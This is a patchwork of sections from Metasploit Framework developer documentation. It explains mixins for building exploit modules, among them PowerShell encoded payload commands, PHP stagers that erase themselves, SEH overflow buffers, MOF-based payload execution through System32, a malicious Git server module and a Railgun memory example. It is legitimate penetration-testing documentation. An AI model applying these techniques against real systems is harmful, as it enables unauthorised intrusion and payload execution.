Like this: . require 'metasploit/framework/obfuscation/crandomizer/code_factory/base' module Metasploit module Framework module Obfuscation module CRandomizer module CodeFactory class Printf &lt; Base def initialize super @dep = ['printf'] end def stub %Q| int printf(const char*); void stub() { printf(\"Hello World\"); }| end end end end end end end . Notice a couple of things: . | Every class should have its own stub method. And this stub method should return a string that contains the code you wish to inject. In addition, your code should be written as a function so that Metasm knows how to pick it up, hence the printf is in a void stub() function. | If your stub requires a native API (in this case, we are using printf), then you must add this function name in the @dep instance variable, which is an array. | Please keep in mind that your stub should remain simple and small, and not unique.

Note that msfdb will ask if you wish to run the JSON RPC web service - but it is not required for this guide which shows how to run the JSON service directly with thin or Puma: . First run the Metasploit database: . msfdb init . After configuring the database the JSON RPC service can be initialized with the thin Ruby web server: . bundle exec thin --rackup msf-json-rpc.ru --address 0.0.0.0 --port 8081 --environment production --tag msf-json-rpc start . Or with Puma: . bundle exec puma msf-json-rpc.ru --port 8081 --environment production --tag msf-json-rpc start . Development . If you are wanting to develop or debug the Ruby implementation of the JSON RPC service - it can be useful to run the Metasploit API synchronously in the foreground. This allows for console logs to appear directly in the terminal, as well as being able to interact with breakpoints via require 'pry-byebug'; binding.pry: . It is possible to debug Msfconsole’s webservice component too: . bundle exec ruby ./msfdb reinit bundle exec ruby ./msfdb --component webservice stop bundle exec ruby ./msfdb --component webservice --no-daemon start . RPC Logging . You can configure the RPC service logging with the MSF_WS_DATA_SERVICE_LOGGER environment variable. The list of supported loggers is viewable with msfconsole --help. The list at the time of writing is: . | Stdout / Stderr / StdoutWithoutTimestamps - Write logs to stdout/stderr | Flatfile / TimestampColorlessFlatfile - Write logs to ~/.msf4/logs | .

WARNING: The nature of using ngrok is to send traffic through a third party. ngrok and the server which it utilizes are not affiliated with the Metasploit project. Use of ngrok effectively sends traffic through an untrusted third party and should be done with extreme caution. While Meterpreter has offered end-to-end encryption since Metasploit 6.0, other payloads and connections do not. ngrok can start multiple types of tunnels. The tcp tunnel is compatible with Metasploit’s payloads and most closely resembles a traditional port-forwarding configuration. The http tunnel type is not compatible with payloads, and should not be used. The tls tunnel type may be compatible, but access to it is restricted to the Enterprise and Pay-as-you-go paid plans. This document will focus on the use cases for the tcp tunnel type. Note that one limitation is that the public port can not be configured, it is randomly selected by ngrok meaning that the target will need to be able to connect to this high, obscure port which may be prevented by egress filtering.

    "content": "Arbitrary file upload is surprisingly common among web applications, which can be abused to upload malicious files and then compromise the server. Usually, the attacker will select a payload based on whatever server-side programming language is supported. So if the vulnerable app is in PHP, then clearly PHP is supported, therefore an easy choice would be using a PHP payload such as Metasploit’s PHP meterpreter. However, the PHP meterpreter does not share the same performance as, say, a Windows meterpreter. So in reality, what happens is you will probably want to upgrade to a better shell, which involves extra manual work during the process. So why limit your payload options? For this type of scenario, you should use the PhpEXE mixin. It serves as a payload stager in PHP that will write the final malicious executable onto the remote file system, and then clear itself after use, so it leaves no traces. Requirements . To use the PhpEXE mixin, some typical exploitable requirements should be met: . | You must find a writeable location on the web server. | The same writeable location should also be readable with a HTTP request. | . Note: For an arbitrary file upload bug, there is usually a directory that contains uploaded files, and is readable. If the bug is due to a directory traversal, then a temp folder (either from the OS or the web app) would be your typical choice. Usage . First include the mixin under the scope of your MetasploitModule class like the following: . include Msf::Exploit::PhpEXE . Generate the payload (with the PHP stager) with get_write_exec_payload . p = get_write_exec_payload . If you’re working on a Linux target, then you can set unlink_self to true, which will automatically clear the executable: . p = get_write_exec_payload(:unlink_self=&gt;true) . On Windows, you probably cannot clear the executable because it will probably still be in use. If it’s not possible to automatically clean up malicious files, you should always warn the user about where they are, so they can do it manually later during the penetration test. At this point you can upload the payload generated by get_write_exec_payload, and then call it by using a GET request. If you do not know how to send a GET request, please refer to the following article: How to Send an HTTP Request Using HttpClient .

Capture Plugin . Capturing credentials is a critical and early phase in the playbook of many offensive security testers. Metasploit has facilitated this for years with protocol-specific modules all under the modules/auxiliary/server/capture directory. Users can start and configure each of these modules individually, but now the capture plugin can streamline the process. The capture plugin can easily start 13 different services (17 including SSL enabled versions) on the same listening IP address including remote interfaces via Meterpreter. A configuration file can be used to select individual services to start and once finished, all services can easily be stopped using a single command. To use the plugin, it must first be loaded. That will provide the captureg command (for Capture-Global) which then offers start and stop subcommands.

    "title": "Powershell",
    "content": "PowerShell is a scripting language developed by Microsoft. It provides API access to almost everything in a Windows platform, less detectable by countermeasures, easy to learn, therefore it is incredibly powerful for penetration testing during post exploitation, or exploit development for payload execution. Take Metasploit’s windows/smb/psexec_psh.rb module for example: it mimics the psexec utility from SysInternals, the payload is compressed and executed from the command line, which allows it to be somewhat stealthy against antivirus. There’s only less than 30 lines of code in psexec_psh.rb (excluding the metadata that describes what the module is about), because most of the work is done by the Powershell mixin, nothing is easier than that. The command line will automatically attempt to detect the architecture (x86 or x86_64) that it is being run in, as well as the payload architecture that it contains. If there is a mismatch it will spawn the correct PowerShell architecture to inject the payload into, so there is no need to worry about the architecture of the target system. Requirements . To use the PowerShell mixin, make sure you meet these requirements: . | The target machine supports PowerShell. Vista or newer should support it. | You must have permission to execute powershell.exe | You must be able to supply system command arguments. | You must set up a command execution type attack in order to execute powershell.exe | . Usage . | To add PowerShell to your module, first you need to require it: | . require 'msf/core/exploit/powershell' . | And then include the mixin within the scope of the Metasploit3 class (or maybe Metasploit4 for some) | . include Msf::Exploit::Powershell . | Use the cmd_psh_payload method to generate the PowerShell payload. | . cmd_psh_payload(payload.encoded, payload_instance.arch.first) . The actual output of cmd_psh_payload is a system command, which would look like the following format (as a one-liner): . %COMSPEC% /B /C start powershell.exe -Command $si = New-Object System.Diagnostics.ProcessStartInfo;$si.FileName = 'powershell.exe'; $si.Arguments = ' -EncodedCommand [BASE64 PAYLOAD] '; $si.UseShellExecute = $false; $si.RedirectStandardOutput = $true;$si.WindowStyle = 'Hidden'; $si.CreateNoWindow = $True; $p = [System.Diagnostics.Process]::Start($si); . A number of options can be used to adjust the final command depending on the circumstances of the exploit. By default the script is compressed but no encoding takes places of the wrapper. This produces a small command of around ~2000 characters (depending on the payload). Of these encode_final_payload is the most noteworthy as it will Base64 encode the full payload giving a very simple command with very few bad characters. However, the command length will increase as a result. Combining this with remove_comspec means the payload would very simply be: . powershell.exe -nop -ep bypass -e AAAABBBBCCCCDDDD.....== .

    "title": "Defining a DLL and its functions",
    "content": "The Windows API is obviously quite large, so by default Railgun only comes with a handful of pre-defined DLLs and functions that are commonly used for building a Windows program. These built-in DLLs are: advapi32, crypt32, dbghelp, iphlpapi, kernel32, netapi32, ntdll, psapi, shell32, spoolss, user32, version, winspool, wlanapi, wldap32, and ws2_32. The same list of built-in DLLs can also be retrieved by using the known_library_names method. All DLL definitions are found in the “def” directory, where they are defined as classes. The following template should demonstrate how a DLL is actually defined: . # -*- coding: binary -*- module Rex module Post module Meterpreter module Extensions module Stdapi module Railgun module Def class Def_windows_somedll def self.create_library(constant_manager, dll_path = 'somedll') dll = Library.new(library_path, constant_manager) # 1st argument = Name of the function # 2nd argument = Return value's data type # 3rd argument = An array of parameters dll.add_function('SomeFunction', 'DWORD',[ ['DWORD','hwnd','in'] ]) return dll end end end; end; end; end; end; end; end . In function definitions, Railgun supports these data types: BOOL, BYTE, DWORD, LPVOID, PBLOB, PCHAR, PDWORD, PULONG_PTR, PWCHAR, ULONG_PTR, VOID, WORD. There are four parameter/buffer directions: in, out, inout, and return. When you pass a value to an “in” parameter, Railgun handles the memory management. For example, MessageBoxA has an “in” parameter named lpText, and is of type PCHAR. You can simply pass a Ruby string to it, and Railgun handles the rest, it’s all pretty straight forward. An “out” parameter will always be of a pointer datatype. Basically you tell Railgun how many bytes to allocate for the parameter, it allocates memory, provides a pointer to it when calling the function, and then it reads that region of memory that the function wrote, converts that to a Ruby object and adds it to the return hash. Some datatypes such as LPVOID and ULONG_PTR have a size that is determined based on the host architecture, e.g. 32-bit versions of Windows use 4-byte/32-bit values. For cross compatibility, the number 4 (for 4-bytes) can be used as the size for these values on both 32-bit and 64-bit systems. The number four comes from the size used for these types in the original 32-bit implementation and was selected to maintain backwards compatibility when 64-bit support was added. An “inout” parameter serves as an input to the called function, but can be potentially modified by it. You can inspect the return hash for the modified value like an “out” parameter. The fourth type, “return” is used as the return data type. It is passed to #add_function after the function name argument. A quick way to define a new function (or redefine an existing function) at runtime can be done like the following example: . client.railgun.add_function('user32', 'MessageBoxA', 'DWORD',[ ['DWORD','hWnd','in'], ['PCHAR','lpText','in'], ['PCHAR','lpCaption','in'], ['DWORD','uType','in'] ]) . However, if this function will most likely be used more than once, or it’s part of the Windows API, then you should put it in to the library. ",

    "content": "The best way to try Railgun is with irb in a Windows Meterpreter prompt. Here’s an example of how to get there: . $ msfconsole -q msf &gt; use exploit/multi/handler msf exploit(handler) &gt; run [*] Started reverse handler on 192.168.1.64:4444 [*] Starting the payload handler... [*] Sending stage (769536 bytes) to 192.168.1.106 [*] Meterpreter session 1 opened (192.168.1.64:4444 -&gt; 192.168.1.106:55148) at 2014-07-30 19:49:35 -0500 meterpreter &gt; irb [*] Starting IRB shell... [*] You are in the \"client\" (session) object &gt;&gt; . Note that when you’re running a post module or in irb, you always have a client or session object to work with, both point to same thing, which in this case is Msf::Sessions::Meterpreter_x86_Win. This Meterpreter session object gives you API access to the target machine, including the Railgun object Rex::Post::Meterpreter::Extensions::Stdapi::Railgun::Railgun. Here’s how you simply access it: . railgun . If you run the above in irb, you will see that it returns information about all the DLLs, functions, constants, etc, except it’s a little unfriendly to read because there’s so much data. Fortunately, there are some handy tricks to help us to figure things out. For example, like we mentioned before, if you’re not sure what DLLs are loaded, you can call the known_dll_name method: . &gt;&gt; railgun.known_library_names =&gt; [\"kernel32\", \"ntdll\", \"user32\", \"ws2_32\", \"iphlpapi\", \"advapi32\", \"shell32\", \"netapi32\", \"crypt32\", \"wlanapi\", \"wldap32\", \"version\", \"psapi\", \"dbghelp\", \"winspool\", \"spoolss\"] . Now, say we’re interested in user32 and we want to find all the available functions (as well as return value’s data type, parameters), another handy trick is this: . railgun.user32.functions.each_pair {|n, v| puts \"Function name: #{n}, Returns: #{v.return_type}, Params: #{v.params}\"} . Note that if you happen to call an invalid or unsupported Windows function, a RuntimeError will raise, and the error message also shows a list of available functions. To call a Windows API function, call the Ruby function of the desired name on the corresponding library (DLL) object. For example to call user32!MessageBoxA: . &gt;&gt; railgun.user32.MessageBoxA(0, \"hello, world\", \"hello\", \"MB_OK\") =&gt; {\"GetLastError\"=&gt;0, \"ErrorMessage\"=&gt;\"The operation completed successfully.\", \"return\"=&gt;1} . As you can see, this API call returns a hash. The “return” key is the return value of the function, as defined by its defined datatype. If the return type is a pointer to a known type (a pointer other than LPVOID, such as PCHAR), then the “return” key will be the value of that type and an additional “&amp;return” key will be included. The “&amp;return” key, when present, is the address in memory at which the “return” value is located. This is useful when the caller needs to both access the value but also have the ability to free it at a later time. Note that in these cases, if the pointer is NULL, “return” will always be Ruby’s nil value and “&amp;return” will be 0. The “GetLastError” key is the threads last-error code, as returned by kernel32!GetLastError. This value is useful for determining if the function call was successful and not not, why it failed. The “ErrorMessage” key is a string to a human readable name of the corresponding “GetLastError” code. When making a function call through railgun, it s important to inspect the results to determine if it was successful before processing any results. There is no error handling for native API calls, so simple mistakes like accessing invalid memory locations will cause the session to close as the host process crashes. ",

Let’s first write some data to it: . &gt;&gt; railgun.memwrite(address, \"AAAA\\x00\".b) =&gt; true . memwrite returns true, which means successful. Now let’s read 4 bytes from the same address: . &gt;&gt; railgun.memread(address, 4) =&gt; \"AAAA\" .

You have your eyes on a particular application that you believe stores the user’s password, but it is encrypted and there are no tools out there for decryption.

Usage for file_create . As the name implies, the file_create method allows you to create a file. You should be using this method because it does more than just writing data to disk. One of the important things it does is it will report the file creation to the database in the format of #{ltype}.localpath, and the file will always be written to Metasploit’s local directory defined in Msf::Config.local_directory (by default this path is ~/.msf4/local), which keep files nice and organized. To use the mixin, first include Msf::Exploit::FILEFORMAT under the scope of your Metasploit3 class: . include Msf::Exploit::FILEFORMAT . And here’s an example of using file_create to build an imaginary exploit: . # This is my imaginary exploit buf = \"\" buf &lt;&lt; \"A\" * 1024 buf &lt;&lt; [0x40201f01].pack(\"V\") buf &lt;&lt; \"\\x90\" * 10 buf &lt;&lt; payload.encoded file_create(buf) . Custom filename . The Msf::Exploit::FILENAME mixin by default has a registered FILENAME datastore option, and it is actually optional. If there’s no filename provided, the mixin will set the name in this format: \"exploit.fileformat.#{self.shortname}\", where self.shortname means the shorter version of the module name. If you wish to set a default one (but still changeable by the user), then you simply register it again in the module, like this: . register_options( [ OptString.new('FILENAME', [true, 'The malicious file name', 'msf.jpg']) ], self.class) . Fixed filename . Occasionally, you might not want your user to change the filename at all. A lazy trick to do that is by modifying the FILENAME datastore option at runtime, but this is very much not recommended. In fact, if you do this, you will not pass msftidy. Instead, here’s how it’s done properly: . 1 - Deregister the FILENAME option . deregister_options('FILENAME') . 2 - Next, override the file_format_filename method, and make it return the filename you want: . def file_format_filename 'something.jpg' end . 3 - Finally, please leave a note about this in the module description.

    "doc": "Git Mixin",
    "title": "Git Mixin",
    "content": "This page walks through the process of creating an exploit module for vulnerable Git clients. Building a Repository . Many of the existing Git exploits in Metasploit rely on being able to host a valid repository that a Git client can successfully clone. So to get started with building an exploit, the contents of the repo need to be decided on first. Let’s say that the repository is something like the following: . space@vm:~/test-repo$ ls -al total 20 drwxrwxr-x 4 space space 4096 Sep 16 14:06 . drwxr-x--- 23 space space 4096 Sep 16 14:05 .. drwxrwxr-x 2 space space 4096 Sep 16 14:06 dir -rw-rw-r-- 1 space space 10 Sep 16 14:06 file.txt drwxrwxr-x 7 space space 4096 Sep 16 14:06 .git space@vm:~/test-repo$ ls -al dir total 12 drwxrwxr-x 2 space space 4096 Sep 16 14:06 . drwxrwxr-x 4 space space 4096 Sep 16 14:06 .. -rw-rw-r-- 1 space space 5 Sep 16 14:06 test_file.txt . The .git directory is the only component of the repository that won’t be sent, so the repository will consist of the file.txt, the dir folder, and the test_file.txt file that lives within the dir folder. Every file and directory inside the repo is represented as a Git object: File contents are represented as blob objects which get coupled together to form a tree object. Lastly, a commit object is created to hold information about the tree object, including the tree’s sha, the author of the commit, a commit message, etc. There will need to be two tree objects to represent the contents of dir and the contents of the root of the repository. Starting with the contents of dir, a blob object needs to be created to represent the contents of test_file.txt: . space@vm:~/test-repo$ cat dir/test_file.txt test . The Git mixin contains the functionality for building a Git object. To build a blob object, the build_blob_object() class method should be used: . &gt;&gt; contents = \"test\\n\" =&gt; \"test\\n\" &gt;&gt; blob = Msf::Exploit::Git::GitObject.build_blob_object(contents) =&gt; #&lt;Msf::Exploit::Git::GitObject:0x00007fe163c75cd0 . The resulting object will contain the object type, its original contents, its compressed contents, its sha, and its path (where the commit object will be stored client side). Since this will be the only file in the dir folder, the tree object can be created with Msf::Exploit::Git::GitObject.build_tree_object(). A tree object is represented differently, holding information about each file contained in the directory, such as file permissions, file name, object type, and the file’s sha1 hash. Because of that, the build_tree_object() expects a hash or an array of hashes, where each hash looks like the following: . &gt;&gt; tree_entry = { mode: '100644', file_name: 'test_file.txt', sha1: blob.sha1 } . And using that, the tree object can now be created: . &gt;&gt; tree_object = Msf::Exploit::Git::GitObject.build_tree_object(tree_entry) =&gt; #&lt;Msf::Exploit::Git::GitObject:0x00007fe161b0cd78 . Now that the dir folder is represented in Git objects, we can represent the root of the repository. That just requires creating a blob object for file.txt, creating a tree object representing the top-level directory, and finally a commit object. Again, a blob object needs to be created to represent the contents of the remaining file: . space@vm:~/test-repo$ cat file.txt some text . &gt;&gt; contents = \"some text\\n\" =&gt; \"some text\\n\" &gt;&gt; file_blob = Msf::Exploit::Git::GitObject.build_blob_object(contents) =&gt; #&lt;Msf::Exploit::Git::GitObject:0x00007fe163bf54b8 ... Then, a new tree object needs to be created to represent the top-level directory, which includes file.txt and the dir folder: . ?&gt; entries = [ ?&gt; { ?&gt; mode: '100644', ?&gt; file_name: 'file.txt', ?&gt; sha1: file_blob.sha1 ?&gt; }, ?&gt; { ?&gt; mode: '040000', ?&gt; file_name: 'dir', ?&gt; sha1: tree_object.sha1 ?&gt; } &gt;&gt; ] =&gt; [{:mode=&gt;\"100644\", :file_name=&gt;\"file.txt\", :sha1=&gt;\"b649a9bf89116c581f8329b8ec3c79a86a70... &gt;&gt; top_level_obj = Msf::Exploit::Git::GitObject.build_tree_object(entries) . The build_commit_object() method takes a hash that expects the sha1 hash for the tree created, the sha1 hash for the parent commit if one exists, and optional data such as an author name, email address, company name, commit message, etc. If the user chooses not to pass in data for the optional data, Faker will generate random data for them. &gt;&gt; commit_object = Msf::Exploit::Git::GitObject.build_commit_object(tree_sha1: top_level_obj.sh a1) =&gt; #&lt;Msf::Exploit::Git::GitObject:0x00007fe1533ac848 ... &gt;&gt; commit_object =&gt; #&lt;Msf::Exploit::Git::GitObject:0x00007fe1533ac848 @compressed= \"x\\x9C\\x95\\xCEA\\x0E\\xC2 \\x10\\x05P\\xD7\\x9Cb&lt;@\\r\\x1DZ\\xCA\\xC2\\x18\\xE3\\xCE\\xA8g0XF!\\xB6\\xD0\\x00]x{I\\xED\\x05\\\\\\xCD\\xE4'\\xF3\\xFE\\xF4a\\x1C]\\x06\\x14j\\x93#\\x11pe\\b\\el5u]cL#\\xD1\\x18\\xC9\\x05\\x97\\x92\\x04*\\xF3h\\xA5P}\\xC7\\x89\\xE99\\xDB\\x10\\xE1\\xEA\\x92\\xF6&amp;j\\xB8\\xCC\\x93\\xD5\\x03\\xEC\\xDF\\xCB\\xBC\\x0Fk~\\xB43\\ri\\xE7)\\x1F\\xA0\\xAEU[\\x10l\\x05T\\x85\\xE4\\xAC_\\xCA3\\xFD\\xC7\\xA8\\x0E%\\nQ\\xE3\\xAA\\xB0\\xB3w\\xD9\\x95\\xA3\\x1F\\a9@\\x98\\xC8\\xC3\\xAB\\xEC\\x91\\xA6\\x90\\\\\\x0E\\xF1\\x03\\xCF\\xF2\\xED\\xC9\\xF9T\\xDD\\x82\\x8D[\\xF6\\x05s\\xF7P\\x89\", @content= \"tree 08de2425ae774dd462dd603066e328db5638c70e\\nauthor Lisandra Kuphal &lt;kuphal_lisandra@huels.net&gt; 1185328253 -0300\\ncommitter Lisandra Kuphal &lt;kuphal_lisandra@huels.net&gt; 872623312 -0300\\n\\nInitial commit to open git repository for Bins-Mohr!\\n\", @path=\"01/8856fe17403b0991e5d1d3eb7f62dca4d8e951\", @sha1=\"018856fe17403b0991e5d1d3eb7f62dca4d8e951\", @type=\"commit\"&gt; . That’s all that is needed to create a valid repository in Metasploit. Hosting the Repository . Metasploit’s current implementation of the Git protocol works over HTTP (SmartHttp docs), so to host a malicious repository with Metasploit, the exploit module needs to leverage the Msf::Exploit::Remote::HttpServer mixin. Additionally, the Git and Git SmartHttp mixins need to be included to build objects and create appropriate responses for the client’s requests. The module should look similar to other exploit modules that use the HttpServer mixin, defining an on_request_uri() method, a primer() method, and an exploit() method. The primer() method is first to execute, so setup for things like the repository uri can happen there: . # Creates a random uri for the Git repo, ensuring that there are no spaces def create_git_uri \"/#{Faker::App.name.downcase}.git\".gsub(' ', '-') end # Uses GIT_URI datastore option or randomly generates a repo URI # Registers the URI with the http server and prints the entire path that client should pass to git clone def primer @git_repo_uri = datastore['GIT_URI'].empty? ? create_git_uri : datastore['GIT_URI'] @git_addr = URI.parse(get_uri).merge(@git_repo_uri) print_status(\"Git repository to clone: #{@git_addr}\") hardcoded_uripath(@git_repo_uri) end . Next, the exploit() method can be used to set up the repository. The code used in the Building a Repository section can be placed here before entering the listen / accept loop. The on_request_uri() method is where most of the module logic will live. No matter what the client sends, the request should first be parsed by Msf::Exploit::Git::SmartHttp::Request.parse_raw_request(). The parse_raw_request() method will format the request so it is easier to work with. The first request that a client will send when cloning a repository is a reference discovery request. The client will expect things like server capabilities and the reference that HEAD points to in the response. Since this is a simple repo only one branch will exist, so HEAD will point to refs/heads/master and refs/heads/master will point to the latest commit in the repo, which in this case is the only commit in the repo. This can be represented as the following hash: . refs = { 'HEAD' =&gt; 'refs/heads/master', 'refs/heads/master' =&gt; commit_object.sha1 } . Creating a proper response to a ref-discovery request is done through Msf::Exploit::Git::SmartHttp.get_ref_discovery_response(). It takes two parameters: The request object from parse_raw_request() and the above refs hash. After the response is built, it can be sent back to the client.: . response = get_ref_discovery_response(request, @refs) cli.send_response(response) . If the client successfully receives the ref-discovery response, it will then send an upload-pack request. The upload-pack request is a POST request containing the client’s capabilities and a ‘want’ list for objects in the repository. To create a proper response, the Msf::Exploit::Git::SmartHttp.get_upload_pack_response() method should be used. Again, this method accepts two arguments. The first is the parsed request from the client, and the second is an array of all objects that exist in the repo. The get_upload_pack_response() method will check the sha1 hash of each object against the hashes in the want list that the client sent and send only the requested object hashes. response = get_upload_pack_response(request, @git_objs) cli.send_response(response) . Upon receiving the upload-pack response from the server, the client will build out the repository. Putting it all together, the module should look something like the following: . ## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ## class MetasploitModule &lt; Msf::Exploit::Remote Rank = ExcellentRanking include Msf::Exploit::Git include Msf::Exploit::Git::SmartHttp include Msf::Exploit::Remote::HttpServer def initialize(info = {}) super( update_info( info, 'Name' =&gt; 'Git Clone Test', 'Description' =&gt; %q{ }, 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ ], 'References' =&gt; [ ], 'DisclosureDate' =&gt; '2022-09-22', 'Platform' =&gt; [ 'unix' ], 'Arch' =&gt; ARCH_CMD, 'Targets' =&gt; [ [ 'Automatic Target', {}] ], 'DefaultTarget' =&gt; 0, 'Notes' =&gt; {} ) ) register_options( [ OptString.new('GIT_URI', [ false, 'The URI to use as the malicious Git instance (empty for random)', '' ]) ] ) deregister_options('RHOSTS', 'RPORT') end def exploit setup_repo_structure super end def setup_repo_structure # create blob object for contents of 'test_file.txt' contents = \"test\\n\" blob = Msf::Exploit::Git::GitObject.build_blob_object(contents) # create tree object representing 'test_file.txt' in 'dir' folder tree_entry = { mode: '100644', file_name: 'test_file.txt', sha1: blob.sha1 } tree_object = Msf::Exploit::Git::GitObject.build_tree_object(tree_entry) # create blob object for contents of 'file.txt' contents = \"some text\\n\" file_blob = Msf::Exploit::Git::GitObject.build_blob_object(contents) # create tree object representing top-level directory of repo entries = [ { mode: '100644', file_name: 'file.txt', sha1: file_blob.sha1 }, { mode: '040000', file_name: 'dir', sha1: tree_object.sha1 } ] top_level_obj = Msf::Exploit::Git::GitObject.build_tree_object(entries) # create commit commit_object = Msf::Exploit::Git::GitObject.build_commit_object(tree_sha1: top_level_obj.sha1) # create list of objects in repository, as the # client will request them to build the repository @git_objs = [ commit_object, top_level_obj, tree_object, file_blob, tree_object, blob ] @refs = { 'HEAD' =&gt; 'refs/heads/master', 'refs/heads/master' =&gt; commit_object.sha1 } end def create_git_uri \"/#{Faker::App.name.downcase}.git\".gsub(' ', '-') end def primer @git_repo_uri = datastore['GIT_URI'].empty? ? create_git_uri : datastore['GIT_URI'] @git_addr = URI.parse(get_uri).merge(@git_repo_uri) print_status(\"Git repository to clone: #{@git_addr}\") hardcoded_uripath(@git_repo_uri) end def on_request_uri(cli, req) request = Msf::Exploit::Git::SmartHttp::Request.parse_raw_request(req) case request.type when 'ref-discovery' response = get_ref_discovery_response(request, @refs) fail_with(Failure::UnexpectedReply, 'Git client did not send a valid ref-discovery request') unless response when 'upload-pack' response = get_upload_pack_response(request, @git_objs) fail_with(Failure::UnexpectedReply, 'Git client did not send a valid upload-pack request') unless response else fail_with(Failure::UnexpectedReply, 'Git client did not send a valid request') end cli.send_response(response) end end .

The connect method will then return the Socket object, which is also accessible globally. But you see, there’s a little more to it.

    "title": "SEH Exploitation",
    "content": "Exception handler overwriting was once a very popular technique to exploit stack buffer overflows, but isn’t so common anymore in newer programs because most likely they’re compiled with SafeSEH. At one point, even with SafeSEH enabled, it was still possible to abuse an exception handler by heap spraying, but of course, memory protections didn’t stop there. DEP/FASLR eventually came to the rescue, so that pretty much ended the glory days of SEH exploits. You can probably still find vulnerable applications not compiled with SafeSEH, but chances are the app is outdated, no longer maintained, or it is more of a learning experiment for the developer. Oh, and there’s probably an exploit for that already. Nonetheless, exploiting a stack buffer overflow with exception handling is still fun, so if you do come across it, here’s how it’s supposed to be written with Metasploit’s Seh mixin. Requirements . To be able to use the SEH mixin, some exploitable requirements must be met: . | The vulnerable program does not have SafeSEH in place. | No DEP (Data Execution Prevention). The mixin uses a short jump to be able to execute the payload, which means the memory must be executable. DEP, as the name implies, prevents that. | . Usage . First, make sure you include the Seh mixin under the scope of your module’s Metasploit3 class: . include Msf::Exploit::Seh . Next, you need to set up a Ret address for the SE handler. This address should be placed in your module’s metadata, specifically under Targets. In Metasploit, each target is actually an array of two elements. The first element is just the name of the target (and there is currently no strict naming style), the second element is actually a hash that contains information specific to that target, such as the target address. Here’s an example of setting up a Ret address: . 'Targets' =&gt; [ [ 'Windows XP', {'Ret' =&gt; 0x75022ac4 } ] # p/p/r in ws2help.dll ] . As you can see, it’s also a good habit to document what the Ret address does, and which DLL it points to. Ret is actually kind of a special key, because it can be retrieved by using target.ret in the module. In our next examples, you will see target.ret being used instead of coding the target address raw. If you need a tool to find a POP/POP/RET for the Ret address, you can use Metasploit’s msfbinscan utility, which is located under the tools directory. OK now, let’s move on to the methods. There are two methods provided by the Seh mixin: . | generate_seh_payload - Generates a fake SEH record with the payload attached right after. Here’s an example: | . buffer = '' buffer &lt;&lt; \"A\" * 1024 # 1024 bytes of padding buffer &lt;&lt; generate_seh_payload(target.ret) # SE record overwritten after 1024 bytes . The actual layout of buffer should look like this in memory: . [ 1024 bytes of 'A' ][ A short jump ][ target.ret ][ Payload ] . | generate_seh_record - Generates a fake SEH record without the payload, in case you prefer to place the payload somewhere else. Code example: | . buffer = '' buffer &lt;&lt; \"A\" * 1024 # 1024 bytes of padding buffer &lt;&lt; generate_seh_payload(target.ret) buffer &lt;&lt; \"B\" * 1024 # More padding . The memory layout should like this: . [ 1024 bytes of 'A' ][ A short jump ][ target.ret ][ Padding ] .

    "content": "Windows Management Instrumentation (WMI) is Microsoft’s implementation of Web-Based Enterprise Management (WBEM), which uses Managed Object Format (MOF) to create Common Information Model (CIM) classes. The security community was actually unfamiliar with the evilness of this technology until the birth of Stuxnet, which used a MOF file to exploit a vulnerability allowing the attacker to create files via a fake Printer Spooler service. This technique was later reverse-engineered and demonstrated in Metasploit’s ms10_061_spoolss.rb module, and that significantly changed how we approach write-privilege attacks. Generally speaking, if you find yourself being able to write to system32, you can most likely take advantage of this technique. Requirements . To to able to use the WBemExec mixin, you must meet these requirements: . | Write permission to C:\\Windows\\System32\\ | Write permission to C:\\Windows\\System32\\Wbem\\ | The target must NOT be newer than Windows Vista (so mostly good for XP, Win 2003, or older). This is more of a limitation from the API, not the technique. Newer Windows operating systems need the MOF file to be pre-compiled first. | . Usage . First, include the WbemExec mixin under the scope of your MetasploitModule class. You will also need the EXE mixin to generate an executable: . include Msf::Exploit::EXE include Msf::Exploit::WbemExec . Next, generate a payload name and the executable: . payload_name = \"evil.exe\" exe = generate_payload_exe . And then generate the mof file using the generate_mof method. The first argument should be the name of the mof file, and the second argument is the payload name: . mof_name = \"evil.mof\" mof = generate_mof(mof_name, payload_name) . Now you’re ready to write/upload your files to the target machine. Always make sure you upload the payload executable first to C:\\Windows\\System32\\. upload_file_to_system32(payload_name, exe) # Write your own upload method . And then now you can upload the mof file to C:\\Windows\\System32\\wbem\\: . upload_mof(mof_name, mof) # Write your own upload method . Once the mof file is uploaded, the Windows Management Service should pick that up and execute it, which will end up executing your payload in system32. Also, the mof file will automatically be moved out of the mof directory after use.

    "doc": "BrowserExploitServer",
    "title": "BrowserExploitServer",
    "content": "The Metasploit Framework provides different mixins you can use to develop a browser exploit, mainly they are: . | Msf::Exploit::Remote::HttpServer - The most basic form of a HTTP server. | Msf::Exploit::Remote::HttpServer::HTML - which provides Javascript functions that the module can use when crafting HTML contents. | Msf::Exploit::Remote::BrowserExploitServer - which includes features from both HttpServer and HttpServer::HTML, but with even more goodies. This writeup covers the BrowserExploitServer mixin. | . The Automatic Exploitation Procedure . The BrowserExploitServer mixin is the only mixin specially designed for browser exploitation. Before you use this mixin, you should understand what it does behind the scenes for you: . | It automatically collects the browser information, including things like: OS name, version, browser name, browser version, whether a proxy is used, Java plugin version, Microsoft Office version, etc, etc. If the browser doesn’t have Javascript enabled, then it knows less about the target. All the info gathered will be stored in a profile managed by the mixin. | The mixin will then tag the browser to track the session. It will also use the same tag to retrieve the profile when needed. | Before the mixin decides if it should serve the exploit to the browser, it will check with the module for any exploitable requirements. If the requirements aren’t met, it will send a 404 to the browser, and the operation bails. | If the requirements are met, the mixin will pass the profile (information about the browser gathered during the detection stage) to the module, and let it take over the rest. | . Hint: In the module, you can check the :source key in the profile to determine whether Javascript is enabled or not: If the :source is “script”, it means Javascript is enabled. If it’s “headers” (as in HTTP headers), then the browser has Javascript disabled. Setting Exploitable Requirements . Being able to set browser requirements is an important feature of the mixin. It allows your attack to be smarter, more targeted, and prevents accidents. Here’s a scenario: Say you have a vulnerability against Internet Explorer that only affects a specific range of MSHTML builds, you can set the :os_name, :ua_name, :ua_ver, and :mshtml_build to make sure it doesn’t blindly exploit against anything else. The :mshtml_build requirement can be found in “Product version” under MSHTML’s file properties. Exploitable browser requirements are defined under “BrowserRequirements” in the module’s metadata. Here’s an example of defining a vulnerable target running some ActiveX control: . 'BrowserRequirements' =&gt; { source: /script/i, activex: [ { clsid: '{D27CDB6E-AE6D-11cf-96B8-444553540000}', method: 'LoadMovie' } ], os_name: /win/i } . You can also define target-specific requirements. This is also how the mixin is able to automatically select a target, and you can get it with the “get_target” method. Here’s an example of how to define target-specific requirements for IE8 on Win XP and IE 9 on Win 